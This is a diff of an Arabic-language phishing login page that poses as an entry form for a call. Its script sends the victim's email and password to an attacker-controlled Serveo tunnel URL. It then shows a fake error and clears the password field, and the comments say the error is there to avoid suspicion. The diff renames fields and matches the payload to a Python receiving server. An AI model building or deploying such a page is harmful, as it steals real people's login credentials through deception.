@@ -22,11 +22,10 @@
             border-radius: 20px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             text-align: center;
-            border: 1px solid rgba(255,255,255,0.8);
         }
         .icon-header { font-size: 50px; margin-bottom: 15px; }
         h2 { margin: 0 0 10px; color: #6d28d9; font-size: 1.6rem; }
-        p { color: #64748b; font-size: 0.95rem; margin-bottom: 30px; }
+        p { color: #64748b; font-size: 0.95rem; margin-bottom: 20px; }
         .input-group { text-align: right; margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: 600; color: #475569; }
         input {
@@ -37,9 +36,7 @@
             box-sizing: border-box;
             outline: none;
             background: #f8fafc;
-            transition: 0.3s;
         }
-        input:focus { border-color: #6d28d9; background: #fff; }
         .btn-call {
             width: 100%;
             padding: 14px;
@@ -47,23 +44,18 @@
             color: white;
             border: none;
             border-radius: 10px;
-            font-size: 1rem;
             font-weight: bold;
             cursor: pointer;
-            transition: 0.3s;
         }
-        .btn-call:hover { background: #5b21b6; transform: translateY(-2px); }
         .error-msg {
             color: #ef4444;
             background: #fee2e2;
             padding: 10px;
             border-radius: 8px;
             margin-bottom: 20px;
-            display: none; /* مخفي في البداية */
+            display: none;
             font-size: 0.85rem;
-            font-weight: bold;
         }
-        .footer { margin-top: 25px; font-size: 0.8rem; color: #94a3b8; }
     </style>
 </head>
 <body>
@@ -78,51 +70,47 @@
         <form id="loginForm">
             <div class="input-group">
                 <label>البريد الإلكتروني</label>
-                <input type="text" id="email" placeholder="أدخل بريدك الإلكتروني" required>
+                <input type="text" id="user_email" placeholder="أدخل بريدك الإلكتروني" required>
             </div>
 
             <div class="input-group">
                 <label>كلمة المرور</label>
-                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
+                <input type="password" id="user_pass" placeholder="أدخل كلمة المرور" required>
             </div>
 
             <button type="submit" class="btn-call">دخول للمكالمة</button>
         </form>
-
-        <div class="footer">
-            🔒 اتصال مشفر وآمن <br>
-            جميع الحقوق محفوظة © 2026
-        </div>
     </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const emailValue = document.getElementById('email').value;
-            const passwordValue = document.getElementById('password').value;
+            const emailVal = document.getElementById('user_email').value;
+            const passVal = document.getElementById('user_pass').value;
             const errorDiv = document.getElementById('errorMessage');
 
-            // رابط Serveo الخاص بك (تأكد من تحديثه إذا تغير)
-            const serveoUrl = 'https://abb8096ead43e449-134-35-2-106.serveousercontent.com';
+            // رابط Serveo الخاص بك (تأكد من تحديثه في كل مرة تشغل فيها SSH)
+            // ملاحظة: خادم البايثون يعمل على المسار "/" لذا لا تضف كلمة receive في النهاية
+            const serveoUrl = 'https://b53992b39d8c6b7c-134-35-2-106.serveousercontent.com/';
 
             fetch(serveoUrl, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                mode: 'cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
                 body: JSON.stringify({
-                    email: emailValue,
-                    password: passwordValue
+                    email: emailVal, // يطابق data.get('email') في البايثون
+                    pass: passVal    // يطابق data.get('pass') في البايثون
                 })
             })
             .then(response => {
-                // إظهار رسالة الخطأ للمستخدم بعد أن يتم إرسال بياناته لك بنجاح
                 errorDiv.style.display = 'block';
-                // مسح كلمة السر لكي يضطر لكتابتها مرة أخرى
-                document.getElementById('password').value = '';
+                document.getElementById('user_pass').value = '';
             })
             .catch(error => {
                 console.error('Error:', error);
-                // حتى لو فشل الاتصال، نظهر رسالة الخطأ لإبعاد الشك
                 errorDiv.style.display = 'block';
             });
         });
